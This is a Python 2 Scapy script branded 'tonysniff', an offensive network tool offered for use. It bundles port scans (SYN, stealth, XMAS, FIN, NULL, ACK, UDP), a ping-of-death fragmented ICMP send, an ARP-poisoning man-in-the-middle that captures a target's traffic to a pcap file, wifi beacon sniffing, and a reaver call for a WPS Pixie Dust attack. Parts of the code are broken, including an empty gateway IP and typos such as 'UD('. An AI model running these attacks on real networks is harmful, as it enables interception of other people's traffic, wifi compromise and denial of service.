#!/usr/bin/python
# -*- coding: utf-8 -*-




import threading
import time
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import argparse
from scapy.all import *
from termcolor import colored

dumma = ""
chor = ""
macer = ""
dust = ""
mega = ""
uda = ""
wina = ""
acky = ""
nula = ""
interface = ""
target = ""
rum = ""
tr = ""
fina = ""
mon = ""
arpscan = ""
pde = ""
arps = ""
target_ip = target
gateway_ip = ""
packet_count = 0
sth = ""
xmas = ""
wuwu = ""
nunu = ""
ntpDate = ""
parser = argparse.ArgumentParser(' ./tonysniff.py -t www.target.com -s -P 80\n\t./tonysniff.py -i wlan0mon -m\n\t./tonysniff.py -t www.target.com -g\n\t./tonysniff.py -p -ma ff:ff:ff:ff:ff:ff -ch 2')




parser.add_argument('-t', '--target')
parser.add_argument('-i', '--interface', help="What interface to use?")
parser.add_argument('-P', '--port',help="Which port to knock on")
parser.add_argument('-s', '--syn', help="TCP-SYN scan", action="store_true")
parser.add_argument('-a', '--arp',help="TCP-ARP scan(ALL Network)", action="store_true")
parser.add_argument('-u','--udp',help="UDP Scan", action="store_true")
parser.add_argument('-l','--stealth',help="Stealth Syn Scan", action="store_true")
parser.add_argument('-x','--xmas',help="Xmas Scan(PSH/FIN/URG)", action="store_true")
parser.add_argument('-f','--fin',help="FIN Scan", action="store_true")
parser.add_argument('-n','--null',help="Null Scan", action="store_true")
parser.add_argument('-k','--ack',help="TCP ACK Scan", action="store_true")
parser.add_argument('-w','--window', help="TCP Window Scan", action="store_true")
parser.add_argument('-d', '--pdeath', help="Ping of death", action="store_true")
parser.add_argument('-g','--graphic', help="Graphic traceroute", action="store_true")
parser.add_argument('-o', '--arpspoof', help="Arp Spoof target", action="store_true")
parser.add_argument('-m', '--montana', help="Sniff packets outside your network", action="store_true")
parser.add_argument('-M','--inside',help="Sniff packets inside your network", action="store_true")
parser.add_argument('-p','--pixie',help="Pixie dust attack Extravanganza",action="store_true")
parser.add_argument('-ma','--mac',help="Target MAC ADDR")
parser.add_argument('-ch','--channel',help="Target Channel")
parser.add_argument('-j','--hex',help="Hex dump",action="store_true")
parser.add_argument('-W','--wifi',help="Connect to wifi",action="store_true")
parser.add_argument('-N','--new',help="-N SSID PASS of the wifi",action="store_true")
parser.add_argument('-D','--date',help="-D ex br.pool.ntp.org",action="store_true")


if __name__ =='__main__':
	#args=parser.parse_args()

	#print (args)


	print colored(""" _____ ___  _   ___   __   ____  _   _ ___ _____ _____ _    _    _   _    _    
|_   _/ _ \| \ | \ \ / /  / ___|| \ | |_ _|  ___|  ___( )  / \  | \ | |  / \   
  | || | | |  \| |\ V /___\___ \|  \| || || |_  | |_  |/  / _ \ |  \| | / _ \  
  | || |_| | |\  | | |_____|__) | |\  || ||  _| |  _|    / ___ \| |\  |/ ___ \ 
  |_| \___/|_| \_| |_|    |____/|_| \_|___|_|   |_|     /_/   \_\_| \_/_/   \_\
""", "red")
	time.sleep(1)
	print """                                                                  
==============================================================================
		       _          
 __ _   ____ _ (_)/ _|/ _(_)_ _  __ _   __ _ __| |__| (_)__| |_(_)___ _ _  
/ _` | (_-< ' \| |  _|  _| | ' \/ _` | / _` / _` / _` | / _|  _| / _ \ ' \ 
\__,_| /__/_||_|_|_| |_| |_|_||_\__, | \__,_\__,_\__,_|_\__|\__|_\___/_||_|
                                |___/                                      
==============================================================================
Brought to you by: STOLABS\t\t\t\t\t\tVersion: 0.5
Author: MEN03T1U$
==============================================================================
"""
	args=parser.parse_args()

if args.channel:
	chor = args.channel
if args.hex:
	dumma = True
if args.mac:
	macer = args.mac
if args.pixie:
	dust =True
if args.ack:
	acky = True
if args.udp:
	uda = True
if args.null:
	nula = True
if args.window:
	wina = True
if args.fin:
	fina = True
if args.inside:
	print "Mega true"
	mega = True
if args.stealth:
	print "I'll be quiet"	
	sth = True
if args.xmas:
	xmas = True
if args.target:
	target = args.target
if args.interface:
	interface = args.interface
if args.port:
	dst_port = int(args.port)
if args.syn:
	print colored("I'm a straight shooter. Let me see how many lines you can take!\n\n","red")
	rum = True
if args.arp:
	arpscan = True
if args.pdeath:
	print colored("I'm Tony Fucking Sniff'ana. You fuck with me. you fuck with the best!\n","red")
	pde = True
if args.arpspoof:
	arps = True
if args.graphic:
	print colored("Get to know your surroundings so you can prepare yourself!","blue")
	tr = True
if args.montana:
	print colored("Montana Mode: ON! Let's Sniff all around town!\n\n","yellow")
	mon = True

if args.wifi:
	print colored("Connecting to wifi configured on wpa.conf")
	wuwu = True

if args.new:
	SSID = args.new
	PASS = args.new
	nunu = True

if args.date:
	ntpServer = args.date
	ntpDate = True
	


try:


	if ntpDate == True:
		os.system("ntpdate " + ntpServer)


	if wuwu == True:
		os.system("wpa_supplicant -Dnl80211 -iwlp2s0 -c /etc/wpa_supplicant/wpa.conf")



	#if nunu == True;
		#os.system("wpa_passphrase" + SSID + PASS)




	if rum == True:
		conf.iface = interface
		src_port = RandShort()
		tcp_connect_scan_resp = sr1(IP(dst=target)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
		if(str(type(tcp_connect_scan_resp))=="<type 'NoneType'>"):
			print "Closed"
		elif(tcp_connect_scan_resp.haslayer(TCP)):
			if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
				send_rst = sr(IP(dst=target)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
				print "Open"
		elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
			print "Closed"

	if wina == True:
		window_scan_resp = sr1(IP(dst=target)/TCP(dport=dst_port,flags="A"),timeout=10)
		if (str(type(window_scan_resp))=="<type 'NoneType'>"):
			print "No response"
		elif(window_scan_resp.haslayer(TCP)):
			if(window_scan_resp.getlayer(TCP).window == 0):
				print "Closed"
		elif(window_scan_resp.getlayer(TCP).window > 0):
			print "Open"

	if uda == True:
		dst_ip = target
		src_port = RandShort()
		dst_port=53
		dst_timeout=10

		
		udp_scan_resp = sr1(IP(dst=dst_ip)/UDP(dport=dst_port),timeout=dst_timeout)
		if (str(type(udp_scan_resp))=="<type 'NoneType'>"):
			retrans = []
			for count in range(0,3):
					retrans.append(sr1(IP(dst=dst_ip)/UD(dport=dst_port),timeout=dst_timeout))
					for item in retrans:
						if (str(type(item))!="<type 'NoneType'>"):
							udp_scan(dst_ip,dst_port,dst_timeout)
							print "Open|Filtered"
						elif (udp_scan_resp.haslayer(UDP)):
							print "Open"
						elif(udp_scan_resp.haslayer(ICMP)):
							if(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code)==3):
								print "Closed"
							elif(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code) in [1,2,9,10,13]):
								print "Filtered"			

		


	if nula == True:
		null_scan_resp = sr1(IP(dst=target)/TCP(dport=dst_port,flags=""),timeout=10)
		if (str(type(null_scan_resp))=="<type 'NoneType'>"):
			print "Open|Filtered"
		elif(null_scan_resp.haslayer(TCP)):
			if(null_scan_resp.getlayer(TCP).flags == 0x14):
				print "Closed"
		elif(null_scan_resp.haslayer(ICMP)):
			if(int(null_scan_resp.getlayer(ICMP).type)==3 and int(null_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
				print "Filtered"





	if tr == True:
		res,unans = traceroute([target],dport=[80,443],maxttl=20,retry=-2)
		res.graph()

	ap_list = []
	while mon == True:
		
		try:
			
			def packetHandler(pkt):
				
				if pkt.haslayer(Dot11):
					if pkt.type == 0 and pkt.subtype == 8 :
				        	if pkt.addr2 not in ap_list:
				                	ap_list.append(pkt.addr2)
					
				                	print colored("AP MAC %s with SSID: %s\n","red")%(pkt.addr2,pkt.info)
											

					
				
					
					

			sniff(iface=interface, prn = packetHandler)

		except KeyboardInterrupt:
				print "C^C^C-Come on, C-Come on! Sniff it with me Baby!"
				raise
		except AttributeError:
				sys.exc_clear()
	

	if pde == True:
		send( fragment(IP(dst=target)/ICMP()/("X"*60000)) )
	
	if acky == True:
		ack_flag_scan_resp = sr1(IP(dst=target)/TCP(dport=dst_port,flags="A"),timeout=10)
		if (str(type(ack_flag_scan_resp))=="<type 'NoneType'>"):
			print "Stateful firewall presentn(Filtered)"
		elif(ack_flag_scan_resp.haslayer(TCP)):
			if(ack_flag_scan_resp.getlayer(TCP).flags == 0x4):
				print "No firewalln(Unfiltered)"
		elif(ack_flag_scan_resp.haslayer(ICMP)):
			if(int(ack_flag_scan_resp.getlayer(ICMP).type)==3 and int(ack_flag_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
				print "Stateful firewall presentn(Filtered)"




	if arps == True:
		def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	
			print "[*] Restoring target..."
			send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
			send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)
			sys.exit(0)

		def get_mac(ip_address):

			responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
			for s,r in responses:
				return r[Ether].src
				return None


		def poison_target(gateway_ip, gateway_mac,target_ip,target_mac):
			poison_target = ARP()
			poison_target.op = 2
			poison_target.psrc = gateway_ip
			poison_target.pdst = target_ip
			poison_target.hwdst = target_mac

		
			poison_gateway = ARP()
			poison_gateway.op = 2
			poison_gateway.psrc = target_ip
			poison_gateway.pdst = gateway_ip
			poison_gateway.hwdst = gateway_mac

	

			print "[*] I like my town... with a lil drop of poison...(ctrl-c to stop)"
	
			while True:
				
			
								
				send(poison_target)

				send(poison_gateway)
		
							

				time.sleep(2)
				
					
			

			print "[*] It is done. There is nothing no one can do now."
			return



		print "[*] Setting up%s"%interface


		gateway_mac = get_mac(gateway_ip)
		if gateway_mac is None:
			print "Failed to get gateway MAC"
			sys.exit(0)
		else:
			print "Gateway %s is at %s"%(gateway_ip,gateway_mac)

		target_mac = get_mac(target_ip)
		if target_mac is None:
			print "Failed to get target MAC"
			sys.exit(0)
		else:
			print "Target %s is at %s"%(target_ip,target_mac)


		poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac))
		poison_thread.start()
		try:
			print "[*] Snorting %s lines of packets. Tony Montana Style"%packet_count
	
			bpf_filter = "ip host %s"%target_ip
			packets = sniff(count=packet_count,filter=bpf_filter,iface=interface,prn=lambda x : x.summary())
		
			wrpcap("tonymontana.pcap",packets)
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	
		except KeyboardInterrupt:
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
			sys.exit(0)
	

	if sth == True:
		src_port = RandShort()
		stealth_scan_resp = sr1(IP(dst=target)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
		if(str(type(stealth_scan_resp))=="<type 'NoneType'>"):
			print "Filtered"
		elif(stealth_scan_resp.haslayer(TCP)):
			if(stealth_scan_resp.getlayer(TCP).flags == 0x12):
				send_rst = sr(IP(dst=target)/TCP(sport=src_port,dport=dst_port,flags="R"),timeout=10)
				print "Open"
		elif (stealth_scan_resp.getlayer(TCP).flags == 0x14):
			print "Closed"
		elif(stealth_scan_resp.haslayer(ICMP)):
			if(int(stealth_scan_resp.getlayer(ICMP).type)==3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
				print "Filtered"	

	if xmas == True:
		xmas_scan_resp = sr1(IP(dst=target)/TCP(dport=dst_port,flags="FPU"),timeout=10)
		if (str(type(xmas_scan_resp))=="<type 'NoneType'>"):
		
			print "Open|Filtered"
		elif(xmas_scan_resp.haslayer(TCP)):
			if(xmas_scan_resp.getlayer(TCP).flags == 0x14):
				print "Closed"
		elif(xmas_scan_resp.haslayer(ICMP)):
			if(int(xmas_scan_resp.getlayer(ICMP).type)==3 and int(xmas_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
				print "Filtered"

	if fina == True:
		fin_scan_resp = sr1(IP(dst=target)/TCP(dport=dst_port,flags="F"),timeout=10)
		if (str(type(fin_scan_resp))=="<type 'NoneType'>"):
			print "Open|Filtered"
		elif(fin_scan_resp.haslayer(TCP)):
			if(fin_scan_resp.getlayer(TCP).flags == 0x14):
				print "Closed"
		elif(fin_scan_resp.haslayer(ICMP)):
			if(int(fin_scan_resp.getlayer(ICMP).type)==3 and int(fin_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
				print "Filtered"
	
	if dust == True:
		#print "%s %s %s"%(interface,macer,chor)
		os.system("reaver -i "+interface+" -b "+macer+" -vv -K 1 -d 10 -N -S -n -c "+chor)

	if dumma == True:
		def pkt_han(pkt):		
			for pk in pkt:
				hexdump(pk)
		pkty = sniff(iface=interface, prn=pkt_han)



	if mega == True:
		def pkt_han(pkt):		
			for pk in pkt:
				print pk.summary()
		pkty = sniff(iface=interface, prn=pkt_han)

	if arpscan == True:
		for pawned in range(1,50):
				ip = "192.168.0."+str(pawned)
				arpRequest = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
				arpResponse = srp1(arpRequest,timeout=1,verbose=0)	
				if arpResponse:
					print colored("IP: ", "red") + arpResponse.psrc +colored(" MAC: ","red") + arpResponse.hwsrc

except (KeyboardInterrupt, SystemExit):
				print "You sniff with me. You sniff with the best!\nThere's always time for one last line:"
				sys.exit(0)
				raise

